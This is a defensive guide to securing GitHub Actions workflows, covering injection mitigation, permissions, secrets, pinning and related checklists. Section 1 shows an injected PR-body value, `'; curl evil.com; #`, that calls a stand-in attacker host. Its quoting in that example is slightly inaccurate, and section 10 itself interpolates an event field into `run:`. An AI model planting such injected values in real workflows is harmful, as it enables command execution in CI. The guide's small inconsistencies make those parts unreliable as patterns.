---
name: github-workflow-security-patterns
description: Canonical security patterns for GitHub Actions workflows
version: "1.0.0"
author: JacobPEvans
---

# GitHub Workflow Security Patterns

Best practices and canonical patterns for secure GitHub Actions workflows.

## 1. Expression Injection Mitigation

**Problem**: Untrusted input (PR description, issue body, etc.) directly in `run:` command allows injection attacks.

**Vulnerable Pattern**:
```yaml
- run: curl https://api.example.com -d "${{ github.event.pull_request.body }}"
```

**Attack**: If PR body is `'; curl evil.com; #`, the final command becomes:
```bash
curl https://api.example.com -d "'; curl evil.com; #"
```

**Safe Pattern**: Wrap untrusted input in environment variable
```yaml
- name: Send Data
  env:
    PR_BODY: ${{ github.event.pull_request.body }}
  run: curl https://api.example.com -d "$PR_BODY"
```

**Why Safe**: The untrusted value is now a shell variable, not part of the command syntax. Injection attack becomes literal string value.

**Dangerous contexts to always wrap**:
- `github.event.pull_request.body`
- `github.event.pull_request.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.*.*.message`
- `github.head_ref`

**Reference**: [GitHub Blog: Catching GitHub Actions Workflow Injections](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/)

## 2. Least-Privilege Permissions

**Principle**: Request only minimum permissions needed.

**Anti-pattern** (over-permissioned):
```yaml
jobs:
  build:
    permissions:
      contents: write      # Only reads, not writes
      pull-requests: write # Doesn't create/modify PRs
      issues: write        # Doesn't touch issues
```

**Pattern** (least-privilege):
```yaml
jobs:
  build:
    permissions:
      contents: read  # Minimum for checkout
```

**Why it matters**:
- Limits blast radius if token is compromised
- Follows security principle of least privilege
- Passes CodeQL "missing-workflow-permissions" check
- Auditable - others can see exactly what the token can do

**Permission matrix reference**: Use `codeql-permission-classification` skill

## 3. Reusable Workflow Caller Contract

**Rule**: When calling reusable workflow, caller job must declare permissions for ALL nested jobs.

```yaml
# ci-gate.yml (caller)
validate:
  permissions:
    contents: read      # For nested jobs' checkout steps
    pull-requests: write # For nested job that comments on PR
  uses: ./.github/workflows/_validate.yml

# .github/workflows/_validate.yml (callee)
jobs:
  run-checks:
    permissions:
      contents: read      # Own permission
    steps: ...
  post-comment:
    permissions:
      pull-requests: write  # Own permission
    steps:
      - uses: actions/github-script@v6
        with:
          script: github.rest.pulls.createReview({...})
```

**Why**: Reusable workflow's nested jobs use the caller's `GITHUB_TOKEN`. Caller must declare union of all nested permissions.

## 4. Secret Handling

**Safe Pattern**: Use GitHub Secrets, reference via environment variable

```yaml
- name: Deploy
  env:
    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}  # GitHub masks in logs
  run: |
    # Use $DEPLOY_KEY, never echo it
    curl -H "Authorization: Bearer $DEPLOY_KEY" https://deploy.example.com
```

**DO NOT**:
- Hardcode secrets in workflow files
- Echo secrets to stdout (GitHub tries to mask but not guaranteed)
- Store credentials in repository

**Correct pattern**:
```yaml
# ✅ GOOD
- run: npm publish
  env:
    NPM_TOKEN: ${{ secrets.NPM_TOKEN }}  # GitHub masks in logs

# ❌ BAD
- run: echo "${{ secrets.NPM_TOKEN }}" | npm login  # Don't echo!

# ❌ BAD
- run: npm publish --token abc123xyz  # Hardcoded, visible in logs
```

## 5. Artifact Security

**Pattern**: Upload artifacts with retention, clean up old ones

```yaml
- name: Upload Coverage
  uses: actions/upload-artifact@v6
  with:
    name: coverage-report
    path: coverage/
    retention-days: 7  # Auto-delete after 7 days
```

**DO NOT**:
- Store secrets in artifacts
- Upload sensitive files
- Keep artifacts forever (costs storage)

## 6. Shell Safety

**Pattern**: Use `set -euo pipefail` in multi-line scripts

```yaml
- name: Build & Deploy
  run: |
    set -euo pipefail  # Exit on error, undefined vars, pipe failures
    npm install
    npm run build
    npm run deploy
```

**What it does**:
- `set -e`: Exit immediately if any command fails
- `set -u`: Treat undefined variables as error
- `set -o pipefail`: Pipe command fails if any step fails

**Why**: Prevents silent failures where script continues despite errors.

## 7. Conditional Steps with Proper Context

**Pattern**: Use `if:` conditions for optional steps

```yaml
- name: Deploy to Production
  if: github.event_name == 'push' && github.ref == 'refs/heads/main'
  run: ./deploy-prod.sh

- name: Deploy to Staging
  if: github.event_name == 'pull_request'
  run: ./deploy-staging.sh
```

**Safe condition context**:
- `github.event_name` - Type of event (push, pull_request, etc.)
- `github.ref` - Current branch/tag
- `job.status` - Previous job status
- `needs.<job-id>.result` - Result of dependency

**Dangerous contexts** (never use unescaped):
- `github.event.pull_request.body`
- `github.event.issue.title`
- Anything from user input

## 8. Checksums & Verification

**Pattern**: Verify downloaded tools before running

```yaml
- name: Download Tool
  run: |
    curl -O https://example.com/tool.tar.gz
    echo "abc123def456..." > expected-checksum.txt
    sha256sum -c expected-checksum.txt
    tar -xzf tool.tar.gz

- name: Run Tool
  run: ./tool --process data.txt
```

**Why**: Prevents running tampered or malicious binaries.

## 9. Dependency Version Pinning

**Pattern**: Pin to specific versions, use hashes when possible

```yaml
# ✅ GOOD - Specific version
- uses: actions/checkout@v6

# ❌ BAD - Latest version, could have breaking changes
- uses: actions/checkout@latest

# ✅ BEST - Specific commit hash (immutable)
- uses: actions/checkout@c85c95e3d7381db58e88eab11b5649be8dffe3b6
```

**Note**: GitHub Actions recommends semantic versioning (v6) but hash is most immutable.

## 10. Audit & Logging

**Pattern**: Log all significant actions for audit trail

```yaml
- name: Start Deployment
  run: |
    echo "Deployment started at $(date -u +'%Y-%m-%dT%H:%M:%SZ')"
    echo "Deploying to: ${{ github.event.deployment.environment }}"
    echo "By: ${{ github.actor }}"
```

**DO NOT**:
- Log secrets (GitHub masks but not guaranteed)
- Log sensitive file contents
- Disable logging for "cleaner" output

## Quick Checklist

Before committing a workflow:

- [ ] All permissions are explicit and minimal
- [ ] Untrusted inputs wrapped in `env:` blocks
- [ ] No hardcoded secrets
- [ ] Secrets referenced via `${{ secrets.* }}`
- [ ] Scripts use `set -euo pipefail`
- [ ] Artifacts have retention limits
- [ ] External actions pinned to specific versions
- [ ] `if:` conditions use safe context (no user input)
- [ ] Reusable workflow callers declare all nested permissions
- [ ] CodeQL scan passes (0 security alerts)

## Common Pitfalls & Fixes

| Pitfall | Fix |
|---------|-----|
| Missing `permissions:` block | Add explicit least-privilege permissions |
| `${{ github.event.body }}` in `run:` | Wrap in `env:` variable |
| Over-permissioning with `contents: write` | Use `contents: read` unless truly needed |
| No `set -e` in multi-line scripts | Add `set -euo pipefail` |
| Hardcoded credentials | Move to GitHub Secrets, reference via `env:` |
| Actions at `@latest` | Pin to `@v6` or `@<commit-hash>` |

---

**Remember**: Security in CI/CD is about preventing accidents AND malicious actions. These patterns protect against both.
